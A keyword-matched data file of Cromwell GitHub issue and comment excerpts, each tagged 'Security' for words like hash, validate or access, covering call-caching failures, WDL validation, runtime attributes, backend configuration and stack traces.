Security,It is sometimes inconvenient to use both WDLTool and Cromwell. Is it possible just to make a REST call in Cromwell specifically for validating WLDs and generating inputs? For people who also write UI-s that interact with Cromwell it will make life easier.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2918:132,validat,validating,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2918,1,['validat'],['validating']
Security,"It is very common to provide folders as inputs to different bioinformatic tools. For instance, STAR index is usually computed once per reference genome and then provided to each STAR-based RNA-Seq task as an input. However, when this is done a common caching failure is reported (because it is a folder):; ```; ""hashFailures"": [; {; ""causedBy"": [],; ""message"": ""Is a directory""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2735:312,hash,hashFailures,312,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2735,1,['hash'],['hashFailures']
Security,"It just goes back to the point of the metadata architecture. It's entire intention is to be write once and then read only. People should also not be blindly removing things from it either. Totally agree w/ your 2nd paragraph but the ""remove stuff from metadata"" option is a pretty fundamental change - there are other ways to attack it if it's an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329037148:326,attack,attack,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329037148,1,['attack'],['attack']
Security,"It ran the task and I don't see how it could have done that otherwise.. On Fri, Aug 11, 2017 at 10:13 AM, Thib <notifications@github.com> wrote:. > I'm pretty sure if you see this message it means that it wasn't able to; > get the hash at all; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823882>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk3eHGDQKVm_OJyuRuQ8i9BrfJ1bqks5sXGGJgaJpZM4O0GvF>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321825726:231,hash,hash,231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321825726,1,['hash'],['hash']
Security,"It seems Cromwell is converting the undefined optional string as ""null"" since the inputs for the call are:; ```; ""inputs"": {; ""dockerStr"": ""null""; }; ```. Currently, when one uses optional's for other runtime attributes (such as disks or cpu), the job refuses to run as the JES backend requires values for both, the same way it requires a value for docker. It seems like due to the validation being run on non-docker attributes, when they have missing optional values, the job won't run. Since there is no validation for the docker string, Cromwell is trying to force the optional value as the docker value. It might be best if there was light layer of validation for the docker key which differentiated between a user given value vs an undefined optional. In the case of the optional, it would be good if it failed to run the job so that it would be consistent with the behavior of the other runtime attributes when they fail validation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2564#issuecomment-324371179:382,validat,validation,382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2564#issuecomment-324371179,4,['validat'],['validation']
Security,"It seems that the protocol for setting runtime attributes is to do so within the task, thus allowing expressions based on their values. Say,. ```wdl; task foo {; Int cpus. runtime {; cpus = cpus; }. command {; ./my_binary --threads ${cpus * 2}; }; }; ```. However, a lot of the time, it's not appropriate (in a ""separation of concerns"" sense) to thread the value through the task invocation. For example, you may be setting a Unix group under which all data should be accessed, defining credentials, etc. We're doing this by using the `default_runtime_attributes`, passed in as workflow options. However, these are not visible to the task. This is what we'd like to be able to do, for example:. Workflow Options:; ```json; {; ""default_runtime_attributes"": {; ""AUTH_USER"": ""foo"",; ""AUTH_TOKEN"": ""bar""; }; }; ```. Workflow:; ```wdl; task {; command {; export AUTH_USER=""${AUTH_USER}"" # Taken from default_runtime_attributes; export AUTH_TOKEN=""${AUTH_TOKEN}"" # Taken from default_runtime_attributes; ./my_authenticated_command; }; }; ```. At the moment, this will fail, as `AUTH_USER` and `AUTH_TOKEN` are not defined within the task. Even if you explicitly define it in the task (`String AUTH_USER`, etc.), Cromwell won't automatically seed this from the default options. I can see why it would be useful to define the inputs in the task, for clarity's sake. I'm just thinking out aloud -- so this is very much half-baked -- but perhaps an option would therefore be to have an additional keyword that made it explicit that the task value was to be taken from options:. ```wdl; task {; Int something; runtime String AUTH_USER # ""runtime"" implies this is from the runtime attributes (default or otherwise); runtime String AUTH_TOKEN # Raise an error if undefined or modified within the task. command {; export AUTH_USER=""${AUTH_USER}""; export AUTH_TOKEN=""${AUTH_TOKEN}""; ./my_authenticated_command -n ${something}; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4741:468,access,accessed,468,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4741,1,['access'],['accessed']
Security,"It seems to me that callCaching is not working when a task takes a Directory as input. Take the following example WDL:; ```; version development. workflow main {; call task1 { input: s = ""file"" }; call task2 { input: d = task1.d }; output { String s = task2.s }; }. task task1 {; input {; String s; }. command <<<; set -euo pipefail; mkdir dir; touch ""dir/~{s}""; >>>. output {; Directory d = ""dir""; }. runtime {; docker: ""debian:stable-slim""; }; }. task task2 {; input {; Directory d; }. command <<<; set -euo pipefail; ls ""~{d}""; >>>. output {; String s = read_string(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```. On a first `141477ef-e8e6-4fb9-ae58-5c2e8a646088` run, callCaching for `task2` is negative, as it should, with this error:; ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [; {; ""message"": ""gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir"",; ""causedBy"": []; }; ],; ""message"": ""[Attempted 1 time(s)] - FileNotFoundException: gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir""; }; ],; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. Now though, the directory has been created as a result of the WDL succeeding:; ```; $ gsutil ls gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir; gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir/file; ```. On a second `2690f8a5-4cd4-45e2-a93a-55125a1107f8` run, callCaching for `task2` is negative again though, with this error:; ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [; {; ""message"": ""gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir"",; ""causedBy"": []; }; ],; ""message"": ""[Attempted 1 time(s)] - FileNotFoundException: gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir""; }; ]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6509:783,hash,hashFailures,783,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509,1,['hash'],['hashFailures']
Security,It will be great to be able to configure Access-Control-Allow-Origin * for cromwell to be able to call it via AJAX,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2824:41,Access,Access-Control-Allow-Origin,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2824,1,['Access'],['Access-Control-Allow-Origin']
Security,It won't start new lookups but it won't cancel the other hash lookups in the same batch either.; With the current implementation doing that (cancelling lookups for files in the same batch) would be pretty hard.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1316#issuecomment-324170143:57,hash,hash,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1316#issuecomment-324170143,1,['hash'],['hash']
Security,"It works with the standard backend. <!-- Which backend are you running? -->; SLURM. <!-- Paste/Attach your workflow if possible: -->; cwlVersion: v1.0; class: Workflow. requirements:; SubworkflowFeatureRequirement: {}. inputs:; fastqc_output_dir:; type: string; fastqc_input_files:; type: string[]; fastqc_thread_count:; type: int; multiqc_output_dir:; type: string; outputs: []. steps:; fastqc_mkdir:; run: mkdir-cmd.cwl; in:; directory: fastqc_output_dir; out: [created_directory]; fastqc_execute:; run: fastqc-step.cwl; in:; input_files: fastqc_input_files; output_dir: fastqc_mkdir/created_directory; thread_count: fastqc_thread_count; out: [output_directory]; multiqc_mkdir:; run: mkdir-cmd.cwl; in:; directory: multiqc_output_dir; out: [created_directory]; multiqc_execute:; run: multiqc-cmd.cwl; in:; output_dir: multiqc_mkdir/created_directory; input_dir: fastqc_execute/output_directory; out: [output_directory]; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more. <!-- SLURM backend configuration -->; include required(classpath(""application"")). backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560:983,PASSWORD,PASSWORDS,983,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560,1,['PASSWORD'],['PASSWORDS']
Security,"It would appear that I forgot ValidateActor, and I should probably not skip the PerRequest stuff",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/148#issuecomment-134034234:30,Validat,ValidateActor,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/148#issuecomment-134034234,1,['Validat'],['ValidateActor']
Security,It would be great to be able to include last modified date in the hashing-strategy when using the current `path` strategy. This would prevent having incorrect output from a task if the file was modified but the path was not.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1843:66,hash,hashing-strategy,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1843,1,['hash'],['hashing-strategy']
Security,"It would be helpful if the /query endpoint included total page count when requesting paginated results. **Use case:**; Currently, the response of `/query` endpoint returns workflows from oldest to newest. The requirements for the Job Manager are such that they require information about newest workflows first. One way that the Job Manager can access newest workflows first is they could paginate through the results in reverse order, which is possible if they have access to the total page count. . The other solution for this use case is if there was an option to provide a sort param and sort direction for the query endpoint. A separate [issue] (https://github.com/broadinstitute/cromwell/issues/3082) has been filed for that.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3083:344,access,access,344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3083,2,['access'],['access']
Security,"It would be nice to have some more documentation about this. When I first logged in this morning, I couldn't access the board, so I tried creating an account and that also failed initially for an _unexpected error, please try again later_ sort of thing. . Also, what board do we create Cromwell issues under? My best guess is `Jira Support` and that's where I created my issue: [Cromwell (server) loses ability to poll some workflows](https://broadworkbench.atlassian.net/browse/JS-34), but all of the other issues aren't really Cromwell related. A ""query"" field might also be useful. . These are the boards currently on Jira:; - `Batch Analysis`; - `Cloud Accounts`; - `Data-repo`; - `DevOps`; - `DSP-ELT Backlog`; - `Interactive Analysis`; - `Jira Support`; - `New Project`; - `PERF`; - `PRODUCTION`; - `QA`; - `SAND-NG`; - `SANDBOX`; - `SUPPORT`; - `TERRA ROADMAP`; - `TerraUI`; - `User Metrics`; - `UX`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502892778:109,access,access,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502892778,2,['access'],['access']
Security,"It would be nice to have this information available from the command line too, i.e. a -version flag that dumps the version/hash and exits.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1694#issuecomment-262027405:123,hash,hash,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1694#issuecomment-262027405,1,['hash'],['hash']
Security,"It's a bit more than that - there may be other parts of Cromwell that don't work with proxies. New such places may also appear unexpectedly due to non-testing. In other words, I strongly suggest trying to give Cromwell unrestricted Internet access first.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544923722:241,access,access,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544923722,1,['access'],['access']
Security,"It's currently cheap to `==` `Scope`s since matches satisfy instance equality and misses fail quickly, so filtering `List`s of `Scope`s is not an issue. It's the deep `hashCode` computation to determine map buckets that's the problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-255131528:168,hash,hashCode,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-255131528,1,['hash'],['hashCode']
Security,"It's entirely possible that this resolves all of the big bang problems, including the spray responsiveness. From what I saw yesterday the pain and suffering was primarily coming from the DB access.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/424#issuecomment-180509918:190,access,access,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/424#issuecomment-180509918,2,['access'],['access']
Security,It's expected that `wdltool 0.4` will not validate this as the `String main_output = hello_and_goodbye.hello_output` syntax in workflow outputs was introduced specifically for sub workflows which `wdltool 0.4` pre-dates.; Try to update to the latest version of wdltool and it should validate.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271702261:42,validat,validate,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271702261,2,['validat'],['validate']
Security,"It's not required by the spec per se, but it is required in order to be runnable so presumably what womtool is doing is validating ""can this be run"" instead of ""is this correct syntax"". @cjllanwarne Something to consider, those two things aren't **quite** the same.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-396605877:120,validat,validating,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-396605877,1,['validat'],['validating']
Security,"It's possible that CaaA will both (1) directly expose the Cromwell API and (2) allow hooking in to Terra services such as email. . I filed tickets for this (requires Broad login): [CaaA direct access](https://broadworkbench.atlassian.net/browse/WM-1909), [CaaA email notifs](https://broadworkbench.atlassian.net/browse/WM-1910). Since both of those stories refer to future work in not-Cromwell, I'm going to close this issue for now and we can continue the conversation there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1678#issuecomment-1508942159:47,expose,expose,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1678#issuecomment-1508942159,2,"['access', 'expose']","['access', 'expose']"
Security,"JECT"". ## Base bucket for workflow executions; root = ""$BUCKET""; name-for-call-caching-purposes: PAPI; #60000/min in google; ##genomics-api-queries-per-100-seconds = 90000; virtual-private-cloud {; network-name = ""$NET""; subnetwork-name = ""$SUBNET""; }; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; 	 request-workers = 4; batch-timeout = 7 days; 	 # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; 	 slow-job-warning-time: 24 hours; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; compute-service-account = ""default""; # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false; ## Location; location = ""europe-west1"". ; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""$PROJECT""; caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""reference""; }; }; }. default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2 GB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 HDD""; noAddress: false; preemptible: 1; zones: [""europe-west1-b""]; }; }; }; }; }. database {; ...; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:11469,access,accessible,11469,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['access'],['accessible']
Security,JES authentication documentation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/532:4,authenticat,authentication,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/532,1,['authenticat'],['authentication']
Security,"JES now allows for labels to be applied to pipeline runs. Labels are important because they allow us to tag pipeline tasks with metadata which is exposed in other Google APIs, specifically in billing exports that are visible in BigQuery. This will allow us to, for example, calculate the exact cost of a pipeline run which is immensely important for FireCloud and @abaumann . The changes to the pipelines API are described here:. https://cloud.google.com/genomics/reference/rest/v1alpha2/pipelines/run#RunPipelineArgs.FIELDS.labels. Cromwell should propagate the workflow level labels to the JES calls for downstream use. According to Google, we should be able to see these labels right away in the operations metadata",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1624:146,expose,exposed,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1624,1,['expose'],['exposed']
Security,"JIRA Issue for ref: [BA-6364](https://broadworkbench.atlassian.net/browse/BA-6364). Hi, I have a simple workflow that import subworkflow. After the subworkflow is run I would like to access an output from particular task from it. The output is not declared as an output of the subworkflow, and subworkflow is not maintained by us so I do not have a (easy) possibility to modify it. Here is the workflow:. ```; import ""subworkflow.wdl"" as sub; workflow hello {; call sub.hello; call show {; input: data = hello.say_hello.out; }; }; task show {; String data; command {; cat ${data}; }; }; ```. And subworkflow.; ```; workflow hello {; String name = ""John""; call say_hello {input: name = name}; }; task say_hello {; String name; command {; which python; python --version; echo ""Hello ${name}!""; }; output {; String out = stdout(); }; }; ```; Of course I have an error: Call ‘hello’ doesn’t have an output ‘say_hello’ (line 6, col 29). But according to specs: `If the output {...} section is omitted, then the workflow includes all outputs from all calls in its final output.`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5479:183,access,access,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5479,1,['access'],['access']
Security,"Jeff -- thanks for following up and confirming I wasn't missing anything. I realized I was testing on this system with a custom local build so swapped over to the pre-build conda package, and magically, the problem morphed into #3584. I'm very confused but don't think this is reproducible now so will close. Now only the null file hashing issue is causing trouble. Sorry for wasting your time looking at this and thanks again for all the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3607#issuecomment-389261690:332,hash,hashing,332,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3607#issuecomment-389261690,1,['hash'],['hashing']
Security,Jes Authentication v2,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/225:4,Authenticat,Authentication,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/225,1,['Authenticat'],['Authentication']
Security,"Jira reference: https://broadworkbench.atlassian.net/jira/software/c/projects/BA/issues/BA-6638; Cromwell 51. When using local method in look-up Docker hash together with Docker digest (instead of tag) causes an error because ""@"" symbol is substituted with colon. I have to use tags to be able to get the digest. In ""submit-docker"" section the image is correctly inserted i.e. with ""@"". ```; 2020-10-08 16:08:57,342 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Assigned new job execution tokens to the following groups: 45d03417: 1; 2020-10-08 16:08:57,443 INFO - Attempting to pull python:sha256:d03b690584424b88488e555e26820e458cc624e9d004e3fa0fe3ff99aa81b2b4; 2020-10-08 16:08:57,503 ERROR - Docker pull failed; java.lang.RuntimeException: Error running: docker pull python:sha256:d03b690584424b88488e555e26820e458cc624e9d004e3fa0fe3ff99aa81b2b4; Exit code: 1; invalid reference format. 	at cromwell.docker.local.DockerCliClient.$anonfun$forRun$1(DockerCliClient.scala:58); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.docker.local.DockerCliClient.forRun(DockerCliClient.scala:50); 	at cromwell.docker.local.DockerCliClient.pull(DockerCliClient.scala:37); 	at cromwell.docker.local.DockerCliClient.pull$(DockerCliClient.scala:36); 	at cromwell.docker.local.DockerCliClient$.pull(DockerCliClient.scala:94); 	at cromwell.docker.local.DockerCliFlow$.pull(DockerCliFlow.scala:101); 	at cromwell.docker.local.DockerCliFlow.$anonfun$run$1(DockerCliFlow.scala:35); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:139); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:355); 	at cats.effect.internals.IORunLoop$RestartCallback.run(IORunLoop.scala:366); 	at cats.effect.internals.Trampoline.cats$effect$internals$Trampoline$$immediateLoop(Trampoline.scala:70); 	at cats.effect.internals.Trampoline.startLoop(Trampoline.scala:36); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.super$startLoop(TrampolineEC.s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5925:152,hash,hash,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5925,1,['hash'],['hash']
Security,"JobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+).*""; filesystems {. local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hashing-strategy: ""path""; }; }; }. }; }; ```; Thanks for any tips or pointers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:5091,hash,hashing-strategy,5091,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['hash'],['hashing-strategy']
Security,JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:35); 		... 12 more; 		Suppressed: wdl4s.exception.VariableLookupException: inputBams:; Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 			at wdl4s.Call.wdl4s$Call$$lookup$2(Call.scala:176); 			at wdl4s.Call$$anonfun$lookupFunction$1.ap,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:4457,Validat,ValidationException,4457,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['Validat'],['ValidationException']
Security,JsonMarshaller$1.apply(SprayJsonSupport.scala:42); #011at spray.httpx.SprayJsonSupport$$anonfun$sprayJsonMarshaller$1.apply(SprayJsonSupport.scala:44); #011at spray.json.PrettyPrinter$.apply(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.apply(JsonPrinter.scala:27); #011at spray.json.PrettyPrinter$.apply(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.apply(JsonPrinter.scala:37); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:29); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:34); #011at spray.json.PrettyPrinter$.printObject(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.printObject(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$.printSeq(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.printSeq(JsonPrinter.scala:90); #011at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); #011at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221); #011at spray.json.JsonPrinter$$anonfun$printSeq$1.apply(JsonPrinter.scala:90); #011at spray.json.JsonPrinter$$anonfun$printSeq$1.apply(JsonPrinter.scala:92); #011at spray.json.PrettyPrinter$$anonfun$printObject$2.apply(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$$anonfun$printObject$2.apply(PrettyPrinter.scala:46); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:34); #011at spray.json.PrettyPrinter$.printObject(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.printObject(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$.printSeq(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.printSeq(JsonPrinter.scala:90); #011at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245); #011at 